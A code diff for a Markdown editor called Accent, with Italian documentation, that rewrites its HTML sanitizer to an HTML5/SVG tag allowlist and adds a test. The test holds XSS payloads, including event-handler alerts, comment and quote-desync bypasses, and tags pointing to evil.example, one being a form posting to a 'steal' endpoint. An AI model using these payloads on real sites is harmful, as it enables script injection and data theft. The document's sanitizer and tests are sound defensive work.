@@ -67,10 +67,10 @@ fn calcola_statistiche(buffer: &DocumentBuffer) -> DocumentStats {
 |:---|:---:|:---|:---:|
 | `accent-core` | L1 | Buffer Rope, parser AST `comrak`, Live Spans | Attivo |
 | `accent-storage` | L2 | Salvataggio atomico e journal di ripristino | Attivo |
-| `accent-mermaid` | L3 | Rendering nativo diagrammi Mermaid | Pianificato |
-| `accent-export` | L3 | Esportazione nativa HTML, PDF, DOCX, EPUB | Attivo |
+| `accent-mermaid` | L3 | Rendering nativo diagrammi Mermaid | Attivo |
+| `accent-export` | L3 | Esportazione nativa HTML, PDF, DOCX, ODT, LaTeX, EPUB | Attivo |
 | `accent-session` | L4 | Stato sessione, configurazione, localizzazione | Attivo |
-| `accent-ui` | L5 | Interfaccia utente `egui`, temi, scorciatoie | Attivo |
+| `accent-ui` | L5 | Shell Tauri v2, Svelte 5, CodeMirror 6, temi e palette | Attivo |
 
 ## 5. Architettura del Sistema e Flussi Operativi
 
@@ -79,9 +79,9 @@ dati **Rope** (`ropey::Rope`) che consente inserimenti, cancellazioni
 e conversioni tra offset di byte, caratteri Unicode e righe in tempo
 logaritmico $O(\\log N)$.
 
-1. **CommonMark Standard**: supporto rigoroso per la specifica base, incluse le regole sugli underscore intraparola (`campo_identificativo_documento__c`).
-2. **GitHub Flavored Markdown (GFM)**: tabelle, elenchi di attività (`- [x]`), testo barrato (`~~barrato~~`), autolink e blocchi di avviso.
-3. **GitLab Flavored Markdown (GLFM)**: blocchi matematici inline e display, note a piè di pagina e metadati frontmatter.
+1. **CommonMark Standard (`0.29`)**: supporto rigoroso per la specifica base, incluse le regole sugli underscore intraparola (`campo_identificativo_documento__c`).
+2. **GitHub Flavored Markdown (`0.29-gfm`)**: tabelle, elenchi di attività (`- [x]`), testo barrato (`~~barrato~~`), autolink estesi e filtro HTML sicuro.
+3. **Estensioni Modulari**: formule matematiche offline (`KaTeX`), diagrammi `Mermaid`, avvisi (`[!NOTE]`), note a piè di pagina e frontmatter YAML.
 
 #### 5.1 Persistenza Atomica e Scorrevolezza
 Ogni salvataggio su disco avviene tramite scrittura su file temporaneo,
@@ -96,10 +96,10 @@ pub const TUTORIAL_MARKDOWN: &str = "\
 **Accent** è un editor e visualizzatore Markdown veloce, elegante e privo di distrazioni.
 
 ## 1. Modalità di Editing e Anteprima
-Usa il pulsante **Anteprima** nella barra superiore per scegliere in modo chiaro e univoco tra:
-- **Solo editor (Markdown sorgente)**: visualizza sempre i marcatori Markdown (`**grassetto**`, `*corsivo*`, `~~barrato~~`).
-- **Anteprima durante la digitazione**: nasconde automaticamente i delimitatori `**` o `~~` finché il cursore non entra nella parola.
-- **Pannello di anteprima**: apre l'anteprima formattata *A metà larghezza*, *A tutta pagina*, *A metà altezza* o *In una finestra separata*.
+Usa il selettore della vista nella barra superiore per scegliere in modo chiaro e univoco tra:
+- **Modifica (Markdown sorgente)**: visualizza sempre i marcatori Markdown (`**grassetto**`, `*corsivo*`, `~~barrato~~`).
+- **Anteprima in-line •**: nasconde automaticamente i delimitatori e renderizza tabelle, formule e diagrammi finché il cursore non entra nel blocco.
+- **Anteprima split e Solo lettura**: apre il pannello formattato *Anteprima split a destra*, *Anteprima split sotto* o *Solo lettura*.
 
 ## 2. Apertura e Salvataggio Documenti
 - Fai clic su **Apri ▾** in alto a sinistra per aprire rapidamente un documento recente oppure sfogliare il disco con **Apri documento...**.
@@ -306,38 +306,37 @@ impl MarkdownConfig {
     }
 }
 
-const GFM_DISALLOWED_RAW_HTML_TAGS: [&str; 9] = [
-    "title",
-    "textarea",
-    "style",
-    "xmp",
-    "iframe",
-    "noembed",
-    "noframes",
-    "script",
-    "plaintext",
+const ALLOWED_HTML_AND_SVG_TAGS: &[&str] = &[
+    // Structural & prose HTML elements
+    "a", "abbr", "address", "article", "aside", "b", "bdi", "bdo", "blockquote", "br",
+    "caption", "cite", "code", "col", "colgroup", "data", "dd", "del", "details", "dfn",
+    "div", "dl", "dt", "em", "figcaption", "figure", "footer", "h1", "h2", "h3", "h4",
+    "h5", "h6", "header", "hgroup", "hr", "i", "img", "input", "ins", "kbd", "li", "main",
+    "mark", "nav", "ol", "p", "picture", "pre", "q", "rp", "rt", "ruby", "s", "samp",
+    "section", "small", "source", "span", "strong", "sub", "summary", "sup", "table",
+    "tbody", "td", "tfoot", "th", "thead", "time", "tr", "u", "ul", "var", "wbr",
+    // Static SVG presentation elements (excludes script, style, foreignObject, set, animate*)
+    "svg", "g", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
+    "text", "tspan", "defs", "marker", "lineargradient", "radialgradient", "stop",
+    "clippath", "mask", "pattern", "symbol", "desc",
 ];
 
-fn is_disallowed_raw_html_tag(slice_from_lt: &str) -> bool {
-    let bytes = slice_from_lt.as_bytes();
-    if bytes.len() < 3 || bytes[0] != b'<' {
+fn is_allowed_html_or_svg_tag(tag_lower: &str) -> bool {
+    ALLOWED_HTML_AND_SVG_TAGS.contains(&tag_lower)
+}
+
+fn is_void_html_tag(tag_lower: &str) -> bool {
+    matches!(tag_lower, "br" | "col" | "hr" | "img" | "input" | "source" | "wbr")
+}
+
+fn is_valid_ascii_attr_name(name: &str) -> bool {
+    let bytes = name.as_bytes();
+    if bytes.is_empty() || !bytes[0].is_ascii_alphabetic() {
         return false;
     }
-    let name_start = if bytes[1] == b'/' { 2 } else { 1 };
-    let rest = &bytes[name_start..];
-    for tag in GFM_DISALLOWED_RAW_HTML_TAGS {
-        let tb = tag.as_bytes();
-        if rest.len() >= tb.len() && rest[..tb.len()].eq_ignore_ascii_case(tb) {
-            if rest.len() == tb.len() {
-                return true;
-            }
-            let next = rest[tb.len()];
-            if next.is_ascii_whitespace() || next == b'>' || next == b'/' {
-                return true;
-            }
-        }
-    }
-    false
+    bytes[1..]
+        .iter()
+        .all(|b| b.is_ascii_alphanumeric() || *b == b'-' || *b == b'_' || *b == b':')
 }
 
 fn decode_html_entities_minimal(val: &str) -> String {
@@ -398,7 +397,7 @@ fn decode_html_entities_minimal(val: &str) -> String {
     out
 }
 
-fn is_dangerous_uri_value(raw_val: &str) -> bool {
+pub fn is_dangerous_uri_value(raw_val: &str) -> bool {
     let decoded = decode_html_entities_minimal(raw_val);
     let mut compact = String::with_capacity(decoded.len());
     for ch in decoded.chars() {
@@ -408,7 +407,16 @@ fn is_dangerous_uri_value(raw_val: &str) -> bool {
     }
     compact.starts_with("javascript:")
         || compact.starts_with("vbscript:")
-        || compact.starts_with("data:text/html")
+        || compact.starts_with("file:")
+        || (compact.starts_with("data:")
+            && !(compact.starts_with("data:image/png;base64,")
+                || compact.starts_with("data:image/jpeg;base64,")
+                || compact.starts_with("data:image/gif;base64,")
+                || compact.starts_with("data:image/webp;base64,")
+                || compact.starts_with("data:image/bmp;base64,")
+                || compact.starts_with("data:image/x-icon;base64,")
+                || compact.starts_with("data:image/avif;base64,")
+                || compact.starts_with("data:image/svg+xml;base64,")))
 }
 
 fn is_dangerous_style_value(raw_val: &str) -> bool {
@@ -433,160 +441,302 @@ fn is_dangerous_style_value(raw_val: &str) -> bool {
     compact.contains("javascript:")
         || compact.contains("vbscript:")
         || compact.contains("expression(")
+        || compact.contains("@import")
+        || compact.contains("url(")
+        || compact.contains("position:fixed")
 }
 
-fn push_sanitized_attr_value(out: &mut String, val: &str, quote_char: Option<char>) {
-    match quote_char {
-        Some('"') => {
-            out.push('"');
-            out.push_str(val);
-            out.push('"');
+fn push_canonical_double_quoted_attr_value(out: &mut String, val: &str) {
+    out.push('"');
+    for ch in val.chars() {
+        match ch {
+            '"' => out.push_str("&quot;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            _ => out.push(ch),
         }
-        Some('\'') => {
-            out.push('\'');
-            out.push_str(val);
-            out.push('\'');
-        }
-        None | Some(_) => {
-            out.push('"');
-            for ch in val.chars() {
-                if ch == '"' {
-                    out.push_str("&quot;");
-                } else {
-                    out.push(ch);
-                }
-            }
-            out.push('"');
-        }
+    }
+    out.push('"');
+}
+
+/// Finds the exact WHATWG HTML5 §13.2.5.42–51 comment end byte length starting from `tail` (`<!--...`),
+/// handling abruptly-closed comments (`<!-->`, `<!--->`), bang-closed comments (`--!>`), and standard `-->`.
+fn find_html5_comment_byte_len(tail: &str) -> usize {
+    if tail.starts_with("<!-->") {
+        return 5;
+    }
+    if tail.starts_with("<!--->") {
+        return 6;
+    }
+    let after_open = &tail[4..];
+    let std_close = after_open.find("-->").map(|idx| 4 + idx + 3);
+    let bang_close = after_open.find("--!>").map(|idx| 4 + idx + 4);
+    match (std_close, bang_close) {
+        (Some(a), Some(b)) => a.min(b),
+        (Some(a), None) => a,
+        (None, Some(b)) => b,
+        (None, None) => tail.len(),
     }
 }
 
-fn sanitize_opening_tag_inner(inner: &str, out: &mut String) {
-    let ib = inner.as_bytes();
-    let mut name_end = 0;
-    while name_end < ib.len()
-        && (ib[name_end].is_ascii_alphanumeric()
-            || ib[name_end] == b'-'
-            || ib[name_end] == b':')
+struct ParsedHtmlStartTag<'a> {
+    tag_name: &'a str,
+    tag_lower: String,
+    attrs: Vec<(&'a str, Option<&'a str>)>,
+    self_closing: bool,
+    had_space_before_slash: bool,
+    consumed_bytes: usize,
+}
+
+/// Parses an HTML5 opening tag starting at `tail` (`<tagName ...>`) following WHATWG HTML5 §13.2.5.8–40
+/// tokenization rules so quotes inside attribute names or unquoted attribute values can never desynchronize
+/// tag boundaries (`<b a"> x='<script>...' y=">` closes strictly at the first `>`).
+fn parse_html5_opening_tag(tail: &str) -> Option<ParsedHtmlStartTag<'_>> {
+    let tb = tail.as_bytes();
+    if tb.len() < 3 || tb[0] != b'<' || !tb[1].is_ascii_alphabetic() {
+        return None;
+    }
+
+    let mut p = 1;
+    while p < tb.len()
+        && !tb[p].is_ascii_whitespace()
+        && tb[p] != b'/'
+        && tb[p] != b'>'
     {
-        name_end += 1;
+        p += 1;
     }
-    let tag_name = &inner[..name_end];
-    out.push('<');
-    out.push_str(tag_name);
+    if p >= tb.len() {
+        return None;
+    }
 
-    let rest = &inner[name_end..];
-    let rb = rest.as_bytes();
-    let mut p = 0;
+    let tag_name = &tail[1..p];
+    if !tag_name
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || b == b'-')
+    {
+        return None;
+    }
+    let tag_lower = tag_name.to_ascii_lowercase();
+    let mut attrs: Vec<(&str, Option<&str>)> = Vec::new();
     let mut self_closing = false;
     let mut had_space_before_slash = false;
 
-    while p < rb.len() {
+    loop {
         let ws_start = p;
-        while p < rb.len() && rb[p].is_ascii_whitespace() {
+        while p < tb.len() && tb[p].is_ascii_whitespace() {
             p += 1;
         }
-        if p >= rb.len() {
-            break;
+        if p >= tb.len() {
+            return None;
         }
-        if rb[p] == b'/' {
-            if rest[p + 1..]
-                .bytes()
-                .all(|b| b.is_ascii_whitespace())
-            {
+        if tb[p] == b'>' {
+            return Some(ParsedHtmlStartTag {
+                tag_name,
+                tag_lower,
+                attrs,
+                self_closing,
+                had_space_before_slash,
+                consumed_bytes: p + 1,
+            });
+        }
+        if tb[p] == b'/' {
+            if p + 1 < tb.len() && tb[p + 1] == b'>' {
                 self_closing = true;
                 had_space_before_slash = p > ws_start;
-                break;
+                return Some(ParsedHtmlStartTag {
+                    tag_name,
+                    tag_lower,
+                    attrs,
+                    self_closing,
+                    had_space_before_slash,
+                    consumed_bytes: p + 2,
+                });
             }
             p += 1;
             continue;
         }
 
+        // HTML5 §13.2.5.35 Attribute name state: ends at whitespace, `/`, `=`, or `>` (quotes do NOT open strings!)
         let attr_s = p;
-        while p < rb.len()
-            && !rb[p].is_ascii_whitespace()
-            && rb[p] != b'='
-            && rb[p] != b'/'
+        while p < tb.len()
+            && !tb[p].is_ascii_whitespace()
+            && tb[p] != b'/'
+            && tb[p] != b'='
+            && tb[p] != b'>'
         {
             p += 1;
         }
-        let attr_name = &rest[attr_s..p];
-        if attr_name.is_empty() {
-            p += 1;
-            continue;
+        if p >= tb.len() {
+            return None;
         }
-        let attr_lower = attr_name.to_ascii_lowercase();
+        let attr_name = &tail[attr_s..p];
 
-        while p < rb.len() && rb[p].is_ascii_whitespace() {
+        // After attribute name state
+        while p < tb.len() && tb[p].is_ascii_whitespace() {
             p += 1;
         }
+        if p >= tb.len() {
+            return None;
+        }
 
-        if p < rb.len() && rb[p] == b'=' {
+        if tb[p] == b'=' {
             p += 1;
-            while p < rb.len() && rb[p].is_ascii_whitespace() {
+            while p < tb.len() && tb[p].is_ascii_whitespace() {
                 p += 1;
             }
-            let (val, quote_char) = if p < rb.len() && (rb[p] == b'"' || rb[p] == b'\'') {
-                let q = rb[p];
+            if p >= tb.len() {
+                return None;
+            }
+            if tb[p] == b'>' {
+                attrs.push((attr_name, Some("")));
+                return Some(ParsedHtmlStartTag {
+                    tag_name,
+                    tag_lower,
+                    attrs,
+                    self_closing,
+                    had_space_before_slash,
+                    consumed_bytes: p + 1,
+                });
+            }
+            if tb[p] == b'"' || tb[p] == b'\'' {
+                let q = tb[p];
                 p += 1;
-                let vs = p;
-                while p < rb.len() && rb[p] != q {
+                let val_s = p;
+                while p < tb.len() && tb[p] != q {
                     p += 1;
                 }
-                let v = &rest[vs..p];
-                if p < rb.len() && rb[p] == q {
-                    p += 1;
+                if p >= tb.len() {
+                    // Unclosed quoted attribute running to EOF -> malformed tag
+                    return None;
                 }
-                (v, Some(q as char))
+                let val = &tail[val_s..p];
+                p += 1;
+                attrs.push((attr_name, Some(val)));
             } else {
-                let vs = p;
-                while p < rb.len() && !rb[p].is_ascii_whitespace() {
-                    if rb[p] == b'/'
-                        && rest[p + 1..].bytes().all(|b| b.is_ascii_whitespace())
-                    {
+                // HTML5 §13.2.5.40 Unquoted attribute value state: ends at whitespace or `>` (quotes do NOT open strings!)
+                let val_s = p;
+                while p < tb.len() && !tb[p].is_ascii_whitespace() && tb[p] != b'>' {
+                    if tb[p] == b'/' && p + 1 < tb.len() && tb[p + 1] == b'>' {
                         break;
                     }
                     p += 1;
                 }
-                (&rest[vs..p], None)
-            };
+                if p >= tb.len() {
+                    return None;
+                }
+                let val = &tail[val_s..p];
+                attrs.push((attr_name, Some(val)));
+            }
+        } else {
+            attrs.push((attr_name, None));
+        }
+    }
+}
 
-            if attr_lower.starts_with("on") || attr_lower == "srcdoc" {
+fn emit_sanitized_opening_tag(parsed: &ParsedHtmlStartTag<'_>, out: &mut String) -> bool {
+    // `<input>` is allowed strictly for GFM §5.3 read-only task checkboxes (`type="checkbox" disabled`)
+    if parsed.tag_lower == "input" {
+        let mut is_checkbox = false;
+        let mut is_checked = false;
+        let mut class_val: Option<&str> = None;
+        for &(name, val_opt) in &parsed.attrs {
+            if !is_valid_ascii_attr_name(name) {
                 continue;
             }
-            if matches!(
-                attr_lower.as_str(),
-                "href" | "src" | "xlink:href" | "action" | "formaction" | "poster" | "data"
-            ) {
-                out.push(' ');
-                out.push_str(attr_name);
-                out.push('=');
-                if is_dangerous_uri_value(val) {
-                    out.push_str("\"\"");
-                } else {
-                    push_sanitized_attr_value(out, val, quote_char);
+            let lower = name.to_ascii_lowercase();
+            match lower.as_str() {
+                "type" => {
+                    if val_opt.is_some_and(|v| v.trim().eq_ignore_ascii_case("checkbox")) {
+                        is_checkbox = true;
+                    }
                 }
-            } else if attr_lower == "style" {
-                if !is_dangerous_style_value(val) {
+                "checked" => {
+                    is_checked = true;
+                }
+                "class" => {
+                    if let Some(v) = val_opt {
+                        class_val = Some(v);
+                    }
+                }
+                _ => {}
+            }
+        }
+        if !is_checkbox {
+            return false;
+        }
+        out.push_str("<input type=\"checkbox\"");
+        if let Some(cls) = class_val {
+            out.push_str(" class=");
+            push_canonical_double_quoted_attr_value(out, cls);
+        }
+        if is_checked {
+            out.push_str(" checked=\"\"");
+        }
+        out.push_str(" disabled=\"\" />");
+        return true;
+    }
+
+    out.push('<');
+    out.push_str(parsed.tag_name);
+
+    for &(attr_name, val_opt) in &parsed.attrs {
+        if !is_valid_ascii_attr_name(attr_name) {
+            continue;
+        }
+        let attr_lower = attr_name.to_ascii_lowercase();
+        if attr_lower.starts_with("on")
+            || matches!(
+                attr_lower.as_str(),
+                "srcdoc"
+                    | "formaction"
+                    | "action"
+                    | "attributename"
+                    | "xlink:actuate"
+                    | "autofocus"
+                    | " ping"
+                    | "ping"
+            )
+        {
+            continue;
+        }
+
+        match val_opt {
+            Some(val) => {
+                if matches!(
+                    attr_lower.as_str(),
+                    "href" | "src" | "xlink:href" | "poster" | "data"
+                ) {
                     out.push(' ');
                     out.push_str(attr_name);
                     out.push('=');
-                    push_sanitized_attr_value(out, val, quote_char);
+                    if is_dangerous_uri_value(val) {
+                        out.push_str("\"\"");
+                    } else {
+                        push_canonical_double_quoted_attr_value(out, val);
+                    }
+                } else if attr_lower == "style" {
+                    if !is_dangerous_style_value(val) {
+                        out.push(' ');
+                        out.push_str(attr_name);
+                        out.push('=');
+                        push_canonical_double_quoted_attr_value(out, val);
+                    }
+                } else {
+                    out.push(' ');
+                    out.push_str(attr_name);
+                    out.push('=');
+                    push_canonical_double_quoted_attr_value(out, val);
                 }
-            } else {
+            }
+            None => {
                 out.push(' ');
                 out.push_str(attr_name);
-                out.push('=');
-                push_sanitized_attr_value(out, val, quote_char);
             }
-        } else if !attr_lower.starts_with("on") && attr_lower != "srcdoc" {
-            out.push(' ');
-            out.push_str(attr_name);
         }
     }
 
-    if self_closing {
-        if had_space_before_slash {
+    if parsed.self_closing {
+        if parsed.had_space_before_slash {
             out.push_str(" />");
         } else {
             out.push_str("/>");
@@ -594,14 +744,19 @@ fn sanitize_opening_tag_inner(inner: &str, out: &mut String) {
     } else {
         out.push('>');
     }
+    true
 }
 
 /// Sanitizes `comrak`-rendered HTML before insertion into Accent's WebView or standalone HTML output:
-/// 1. Enforces GFM `§6.11` Disallowed Raw HTML filtering (`<title>`, `<textarea>`, `<style>`, `<xmp>`,
-///    `<iframe>`, `<noembed>`, `<noframes>`, `<script>`, `<plaintext>`) even when `base == CommonMark`,
-///    preventing document-embedded `<style>` or `<script>` blocks from altering application chrome or running JS.
-/// 2. Preserves benign raw HTML tags (`<kbd>`, `<sup>`, `<sub>`, `<details>`, `<summary>`, `<img>`, etc.).
-/// 3. Strips inline event-handler attributes (`on*`, `srcdoc`) and neutralizes `javascript:` / `vbscript:` URIs.
+/// 1. Enforces an explicit HTML5/SVG tag allowlist, blocking GFM `§6.11` Disallowed Raw HTML tags
+///    (`<title>`, `<textarea>`, `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>`, `<script>`,
+///    `<plaintext>`) as well as `<base>`, `<meta>`, `<link>`, `<object>`, `<embed>`, `<form>`,
+///    `<foreignObject>`, and SVG `<set>`/`<animate*>` across both `Gfm` and `CommonMark` modes.
+/// 2. Strips HTML comments (`<!--...-->`, including HTML5 `<!-->`, `<!--->`, and `--!>`) so comment
+///    boundary differentials can never smuggle uninspected tags.
+/// 3. Parses tags with HTML5-compliant attribute tokenization and canonical double-quoted re-serialization,
+///    stripping `on*` event handlers, dangerous URIs (`javascript:`, `vbscript:`, `file:`, non-image `data:`),
+///    and dangerous inline CSS.
 pub fn sanitize_html_for_webview(html: &str) -> String {
     let mut out = String::with_capacity(html.len() + 32);
     let bytes = html.as_bytes();
@@ -620,39 +775,36 @@ pub fn sanitize_html_for_webview(html: &str) -> String {
         let tail = &html[lt..];
         let tb = tail.as_bytes();
 
+        // Strip HTML5 comments completely so comment-closing differentials can never hide tags
         if tail.starts_with("<!--") {
-            if let Some(end_rel) = tail[4..].find("-->") {
-                let end = 4 + end_rel + 3;
-                out.push_str(&tail[..end]);
-                i = lt + end;
-            } else {
-                out.push_str(tail);
-                break;
-            }
+            let comment_len = find_html5_comment_byte_len(tail);
+            i = lt + comment_len;
             continue;
         }
 
-        if is_disallowed_raw_html_tag(tail) {
+        // Escape any other markup declaration (`<!DOCTYPE`, `<![CDATA[`) or processing instruction (`<?`)
+        if tb.len() >= 2 && (tb[1] == b'!' || tb[1] == b'?') {
             out.push_str("&lt;");
             i = lt + 1;
             continue;
         }
 
+        // Closing tag `</tagName ...>`
         if tb.len() >= 3 && tb[1] == b'/' && tb[2].is_ascii_alphabetic() {
-            if let Some(gt_rel) = tail.find('>') {
-                out.push_str(&tail[..=gt_rel]);
-                i = lt + gt_rel + 1;
-            } else {
-                out.push_str("&lt;");
-                i = lt + 1;
+            let mut p = 2;
+            while p < tb.len()
+                && !tb[p].is_ascii_whitespace()
+                && tb[p] != b'>'
+                && tb[p] != b'/'
+            {
+                p += 1;
             }
-            continue;
-        }
-
-        if tb.len() >= 2 && tb[1].is_ascii_alphabetic() {
+            let close_name = &tail[2..p];
+            let close_lower = close_name.to_ascii_lowercase();
+            // Advance to closing `>` respecting HTML5 bogus/attribute states inside end tags
             let mut quote: Option<u8> = None;
             let mut gt_rel: Option<usize> = None;
-            for (k, &b) in tb.iter().enumerate().skip(1) {
+            for (k, &b) in tb.iter().enumerate().skip(p) {
                 if let Some(q) = quote {
                     if b == q {
                         quote = None;
@@ -664,14 +816,37 @@ pub fn sanitize_html_for_webview(html: &str) -> String {
                     break;
                 }
             }
-
             if let Some(gt) = gt_rel {
-                sanitize_opening_tag_inner(&tail[1..gt], &mut out);
-                i = lt + gt + 1;
-            } else {
-                out.push_str("&lt;");
-                i = lt + 1;
+                if close_name
+                    .bytes()
+                    .all(|b| b.is_ascii_alphanumeric() || b == b'-')
+                    && is_allowed_html_or_svg_tag(&close_lower)
+                    && !is_void_html_tag(&close_lower)
+                {
+                    out.push_str("</");
+                    out.push_str(close_name);
+                    out.push('>');
+                    i = lt + gt + 1;
+                    continue;
+                }
             }
+            out.push_str("&lt;");
+            i = lt + 1;
+            continue;
+        }
+
+        // Opening tag `<tagName ...>`
+        if tb.len() >= 2 && tb[1].is_ascii_alphabetic() {
+            if let Some(parsed) = parse_html5_opening_tag(tail) {
+                if is_allowed_html_or_svg_tag(&parsed.tag_lower)
+                    && emit_sanitized_opening_tag(&parsed, &mut out)
+                {
+                    i = lt + parsed.consumed_bytes;
+                    continue;
+                }
+            }
+            out.push_str("&lt;");
+            i = lt + 1;
             continue;
         }
 
@@ -4585,6 +4760,47 @@ Inline $x + y = z$ and footnote[^1].
             );
             // Escaped code inside `<pre><code>` must remain untouched
             assert!(safe.contains("&lt;img src=&quot;x&quot; onerror=&quot;alert('keep inside code block')&quot;&gt;"));
+        }
+    }
+
+    #[test]
+    fn test_html5_sanitizer_blocks_comment_differentials_quote_desync_and_chrome_tags() {
+        let payloads = "\
+<!--><img src=x onerror=alert(1)>-->
+<!---><style>body { display: none !important; }</style>-->
+<!-- --!><script>window.__xss = 1;</script> -->
+<b a\"> x='<script>alert(2)</script><img src=x onerror=alert(3)>' y=\">Testo</b>
+<b a=1\"> <style>.window-shell { opacity: 0; }</style></b>
+<base href=\"https://evil.example/\">
+<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">
+<link rel=\"stylesheet\" href=\"https://evil.example/evil.css\">
+<object data=\"https://evil.example/pwn.swf\"></object>
+<embed src=\"https://evil.example/pwn.swf\">
+<form action=\"https://evil.example/steal\"><input type=\"text\" value=\"spoof\"></form>
+<div onfocus=\"alert(4)\" autofocus tabindex=\"0\">Focus</div>
+<svg><set attributeName=\"onload\" to=\"alert(5)\"/><foreignObject><iframe></iframe></foreignObject></svg>
+<div style=\"position: fixed; inset: 0; background: url(https://evil.example/bg.png)\">Box</div>
+<a href=\"file:///etc/passwd\">Local</a>
+";
+        for cfg in [MarkdownConfig::gfm(), MarkdownConfig::commonmark()] {
+            let safe = render_webview_html(payloads, cfg);
+            let lower = safe.to_ascii_lowercase();
+            assert!(!lower.contains("onerror="), "onerror leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("onfocus="), "onfocus leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("autofocus"), "autofocus leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<script"), "<script leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<style"), "<style leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<base"), "<base leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<meta"), "<meta leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<link"), "<link leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<object"), "<object leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<embed"), "<embed leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<form"), "<form leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<input"), "non-checkbox <input leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<set"), "SVG <set leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("<foreignobject"), "<foreignObject leaked in {cfg:?}: {safe}");
+            assert!(!lower.contains("position: fixed") && !lower.contains("url("), "dangerous CSS leaked: {safe}");
+            assert!(!lower.contains("href=\"file:"), "file: URI leaked: {safe}");
         }
     }
 
